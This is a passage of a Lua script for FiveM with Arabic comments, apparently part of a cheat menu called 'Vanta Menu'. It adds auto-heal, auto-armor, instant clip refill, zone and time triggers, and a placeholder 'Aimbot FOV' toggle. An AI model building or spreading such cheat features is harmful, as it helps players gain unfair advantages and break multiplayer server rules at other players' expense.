        health_low = { enabled = true, lastState = false },
        auto_heal = { enabled = false, lastState = false },
        auto_armor = { enabled = false, lastState = false },
        auto_reload = { enabled = false, lastState = false },
        time_based = { enabled = true, timeMode = "day" },
        weather_trigger = { enabled = false, lastWeather = "" },
        zone_trigger = { enabled = true, inZone = false }
    }
    
    -- بدء مراقبة المحفزات
    self:StartTriggersMonitoring()
    
    print("^2[QD8 Triggers] ^7تم تهيئة نظام المحفزات بنجاح")
end

-- تبديل حالة المحفز
function qd8:ToggleTrigger(triggerId, enabled)
    if TriggersSystem.triggers[triggerId] then
        TriggersSystem.triggers[triggerId].enabled = enabled
        
        local status = enabled and "^2تم تفعيل" or "^1تم إلغاء"
        print(string.format("^3[QD8 Triggers] ^7%s المحفز: ^6%s", status, triggerId))
        
        -- تنفيذ إجراءات خاصة عند التفعيل/الإلغاء
        if enabled then
            self:OnTriggerEnabled(triggerId)
        else
            self:OnTriggerDisabled(triggerId)
        end
        
        -- إرسال إشعار للمستخدم
        local message = enabled and "تم تفعيل المحفز" or "تم إلغاء المحفز"
        self:Notify("success", "Triggers", message .. ": " .. triggerId, 2000)
    end
end

-- تحديث حد المحفز
function qd8:SetTriggerThreshold(triggerId, threshold)
    if triggerId == "health_low" then
        TriggersSystem.settings.healthThreshold = threshold
        print(string.format("^3[QD8 Triggers] ^7تم تحديث حد الصحة إلى: ^6%d", threshold))
    elseif triggerId == "armor_low" then
        TriggersSystem.settings.armorThreshold = threshold
        print(string.format("^3[QD8 Triggers] ^7تم تحديث حد الدرع إلى: ^6%d", threshold))
    end
end

-- تحديث نصف قطر المنطقة
function qd8:SetZoneRadius(radius)
    TriggersSystem.settings.zoneRadius = radius
    print(string.format("^3[QD8 Triggers] ^7تم تحديث نصف قطر المنطقة إلى: ^6%d", radius))
end

-- عند تفعيل محفز
function qd8:OnTriggerEnabled(triggerId)
    if triggerId == "auto_heal" then
        self:StartAutoHeal()
    elseif triggerId == "auto_armor" then
        self:StartAutoArmor()
    elseif triggerId == "auto_reload" then
        self:StartAutoReload()
    elseif triggerId == "zone_trigger" then
        self:StartZoneMonitoring()
    end
end

-- عند إلغاء تفعيل محفز
function qd8:OnTriggerDisabled(triggerId)
    if triggerId == "auto_heal" then
        self:StopAutoHeal()
    elseif triggerId == "auto_armor" then
        self:StopAutoArmor()
    elseif triggerId == "auto_reload" then
        self:StopAutoReload()
    elseif triggerId == "zone_trigger" then
        self:StopZoneMonitoring()
    end
end

-- بدء مراقبة المحفزات
function qd8:StartTriggersMonitoring()
    Citizen.CreateThread(function()
        while TriggersSystem.enabled do
            Wait(TriggersSystem.settings.checkInterval)
            
            local playerPed = PlayerPedId()
            if not playerPed or not DoesEntityExist(playerPed) then
                goto continue
            end
            
            -- تحديث بيانات اللاعب
            TriggersSystem.playerData.health = GetEntityHealth(playerPed)
            TriggersSystem.playerData.armor = GetPedArmour(playerPed)
            TriggersSystem.playerData.isInVehicle = IsPedInAnyVehicle(playerPed, false)
            TriggersSystem.playerData.isDead = IsPlayerDead(PlayerId())
            TriggersSystem.playerData.coords = GetEntityCoords(playerPed)
            
            -- فحص محفزات الشروط
            self:CheckConditionTriggers()
            
            ::continue::
        end
    end)
end

-- فحص محفزات الشروط
function qd8:CheckConditionTriggers()
    local triggers = TriggersSystem.triggers
    local playerData = TriggersSystem.playerData
    
    -- فحص محفز الصحة المنخفضة
    if triggers.health_low.enabled then
        local isHealthLow = playerData.health < (TriggersSystem.settings.healthThreshold + 100)
        if isHealthLow and not triggers.health_low.lastState then
            self:ExecuteTrigger("health_low")
            triggers.health_low.lastState = true
        elseif not isHealthLow then
            triggers.health_low.lastState = false
        end
    end
    
    -- فحص محفز الموت
    if triggers.player_death.enabled then
        if playerData.isDead and not triggers.player_death.lastState then
            self:ExecuteTrigger("player_death")
            triggers.player_death.lastState = true
        elseif not playerData.isDead then
            triggers.player_death.lastState = false
        end
    end
    
    -- فحص محفز دخول المركبة
    if triggers.vehicle_enter.enabled then
        if playerData.isInVehicle and not triggers.vehicle_enter.lastState then
            self:ExecuteTrigger("vehicle_enter")
            triggers.vehicle_enter.lastState = true
        elseif not playerData.isInVehicle then
            triggers.vehicle_enter.lastState = false
        end
    end
    
    -- فحص محفز الوقت
    if triggers.time_based.enabled then
        self:CheckTimeTrigger()
    end
    
    -- فحص محفز المنطقة
    if triggers.zone_trigger.enabled then
        self:CheckZoneTrigger()
    end
end

-- تنفيذ محفز
function qd8:ExecuteTrigger(triggerId)
    local trigger = TriggersSystem.triggers[triggerId]
    if not trigger or not trigger.enabled then return end
    
    print(string.format("^5[QD8 Triggers] ^7تم تشغيل المحفز: ^6%s", triggerId))
    
    -- تنفيذ الإجراءات حسب نوع المحفز
    if triggerId == "health_low" and TriggersSystem.triggers.auto_heal.enabled then
        self:AutoHeal()
    elseif triggerId == "player_death" then
        self:OnPlayerDeath()
    elseif triggerId == "vehicle_enter" then
        self:OnVehicleEnter()
    elseif triggerId == "weapon_fire" then
        self:OnWeaponFire()
    end
end

-- الشفاء التلقائي
function qd8:AutoHeal()
    local playerPed = PlayerPedId()
    SetEntityHealth(playerPed, 200)
    self:Notify("success", "Auto Heal", "تم الشفاء التلقائي", 2000)
    print("^2[QD8 Triggers] ^7تم الشفاء التلقائي")
end

-- استعادة الدرع التلقائي
function qd8:AutoArmor()
    local playerPed = PlayerPedId()
    SetPedArmour(playerPed, 100)
    self:Notify("success", "Auto Armor", "تم استعادة الدرع التلقائي", 2000)
    print("^2[QD8 Triggers] ^7تم استعادة الدرع التلقائي")
end

-- بدء الشفاء التلقائي
function qd8:StartAutoHeal()
    Citizen.CreateThread(function()
        while TriggersSystem.triggers.auto_heal.enabled do
            Wait(5000) -- فحص كل 5 ثوان
            
            local health = GetEntityHealth(PlayerPedId())
            if health < 150 then
                self:AutoHeal()
            end
        end
    end)
end

-- بدء استعادة الدرع التلقائي
function qd8:StartAutoArmor()
    Citizen.CreateThread(function()
        while TriggersSystem.triggers.auto_armor.enabled do
            Wait(10000) -- فحص كل 10 ثوان
            
            local armor = GetPedArmour(PlayerPedId())
            if armor < TriggersSystem.settings.armorThreshold then
                self:AutoArmor()
            end
        end
    end)
end

-- بدء إعادة التحميل التلقائي
function qd8:StartAutoReload()
    Citizen.CreateThread(function()
        while TriggersSystem.triggers.auto_reload.enabled do
            Wait(100)
            
            local playerPed = PlayerPedId()
            if IsPedArmed(playerPed, 4) then
                local weapon = GetSelectedPedWeapon(playerPed)
                local ammoInClip = GetAmmoInClip(playerPed, weapon)
                
                if ammoInClip <= 5 then -- إعادة تحميل عند 5 رصاصات أو أقل
                    local maxAmmo = GetMaxAmmo(playerPed, weapon)
                    SetAmmoInClip(playerPed, weapon, maxAmmo)
                end
            end
        end
    end)
end

-- إيقاف الشفاء التلقائي
function qd8:StopAutoHeal()
    print("^1[QD8 Triggers] ^7تم إيقاف الشفاء التلقائي")
end

-- إيقاف استعادة الدرع التلقائي
function qd8:StopAutoArmor()
    print("^1[QD8 Triggers] ^7تم إيقاف استعادة الدرع التلقائي")
end

-- إيقاف إعادة التحميل التلقائي
function qd8:StopAutoReload()
    print("^1[QD8 Triggers] ^7تم إيقاف إعادة التحميل التلقائي")
end

-- فحص محفز الوقت
function qd8:CheckTimeTrigger()
    local hour = GetClockHours()
    local timeMode = TriggersSystem.triggers.time_based.timeMode or "day"
    
    local isDay = hour >= 6 and hour < 18
    local isNight = hour >= 18 or hour < 6
    local isDawn = hour >= 5 and hour < 7
    local isDusk = hour >= 17 and hour < 19
    
    if timeMode == "day" and isDay then
        -- تنفيذ إجراءات النهار
    elseif timeMode == "night" and isNight then
        -- تنفيذ إجراءات الليل
    elseif timeMode == "dawn" and isDawn then
        -- تنفيذ إجراءات الفجر
    elseif timeMode == "dusk" and isDusk then
        -- تنفيذ إجراءات الغسق
    end
end

-- فحص محفز المنطقة
function qd8:CheckZoneTrigger()
    local playerCoords = TriggersSystem.playerData.coords
    if not playerCoords then return end
    
    -- مناطق محددة مسبقاً
    local triggerZones = {
        {x = 0.0, y = 0.0, z = 70.0, name = "المنطقة الآمنة"},
        {x = -1037.0, y = -2737.0, z = 20.0, name = "المطار"},
        {x = -2047.0, y = 3132.0, z = 32.0, name = "القاعدة العسكرية"}
    }
    
    local inAnyZone = false
    for _, zone in pairs(triggerZones) do
        local distance = #(playerCoords - vector3(zone.x, zone.y, zone.z))
        if distance <= TriggersSystem.settings.zoneRadius then
            if not TriggersSystem.triggers.zone_trigger.inZone then
                self:Notify("info", "Zone Trigger", "دخلت إلى: " .. zone.name, 3000)
                print(string.format("^3[QD8 Triggers] ^7دخلت إلى: ^6%s", zone.name))
            end
            inAnyZone = true
            break
        end
    end
    
    TriggersSystem.triggers.zone_trigger.inZone = inAnyZone
end

-- بدء مراقبة المناطق
function qd8:StartZoneMonitoring()
    print("^2[QD8 Triggers] ^7تم بدء مراقبة المناطق")
end

-- إيقاف مراقبة المناطق
function qd8:StopZoneMonitoring()
    print("^1[QD8 Triggers] ^7تم إيقاف مراقبة المناطق")
end

-- أحداث اللاعب
function qd8:OnPlayerDeath()
    if TriggersSystem.triggers.player_death.enabled then
        self:Notify("warning", "Player Death", "تم اكتشاف موت اللاعب", 3000)
        print("^1[QD8 Triggers] ^7تم اكتشاف موت اللاعب")
    end
end

function qd8:OnVehicleEnter()
    if TriggersSystem.triggers.vehicle_enter.enabled then
        self:Notify("info", "Vehicle Enter", "تم دخول مركبة", 2000)
        print("^3[QD8 Triggers] ^7تم دخول مركبة")
    end
end

function qd8:OnWeaponFire()
    if TriggersSystem.triggers.weapon_fire.enabled then
        print("^4[QD8 Triggers] ^7تم إطلاق النار")
    end
end

-- تبديل محفز الوقت
function qd8:ToggleTimeTrigger(enabled, timeMode)
    TriggersSystem.triggers.time_based.enabled = enabled
    if timeMode then
        local modes = {"day", "night", "dawn", "dusk"}
        TriggersSystem.triggers.time_based.timeMode = modes[timeMode] or "day"
    end
    
    local status = enabled and "تم تفعيل" or "تم إلغاء"
    self:Notify("success", "Time Trigger", status .. " محفز الوقت", 2000)
end

-- تبديل Aimbot FOV
function qd8:ToggleAimbotFOV(enabled, fov)
    -- هنا يمكن إضافة منطق Aimbot FOV
    local status = enabled and "تم تفعيل" or "تم إلغاء"
    self:Notify("success", "Aimbot FOV", status .. " FOV: " .. (fov or 50), 2000)
    print(string.format("^3[QD8 Triggers] ^7%s Aimbot FOV: %d", status, fov or 50))
end

-- عرض إعدادات المحفزات
function qd8:ShowTriggersConfig()
    self:Notify("info", "Triggers Config", "فتح إعدادات المحفزات المتقدمة", 2000)
    -- هنا يمكن إضافة واجهة إعدادات متقدمة
end

-- عرض إعدادات المناطق
function qd8:ShowZoneConfig()
    self:Notify("info", "Zone Config", "فتح إعدادات المناطق", 2000)
    -- هنا يمكن إضافة واجهة إعدادات المناطق
end

-- مراقبة إطلاق النار
Citizen.CreateThread(function()
    while true do
        Wait(0)
        
        if TriggersSystem.triggers.weapon_fire and TriggersSystem.triggers.weapon_fire.enabled then
            if IsPedShooting(PlayerPedId()) then
                qd8:OnWeaponFire()
                Wait(100) -- تجنب الإرسال المتكرر
            end
        else
            Wait(500) -- تقليل استهلاك الموارد عند عدم التفعيل
        end
    end
end)

-- تهيئة نظام المحفزات عند بدء التشغيل
Citizen.CreateThread(function()
    Wait(2000) -- انتظار تحميل الموارد
    qd8:InitializeTriggers()
end)

print("^2[QD8 Triggers] ^7تم تحميل نظام المحفزات في Vanta Menu بنجاح!")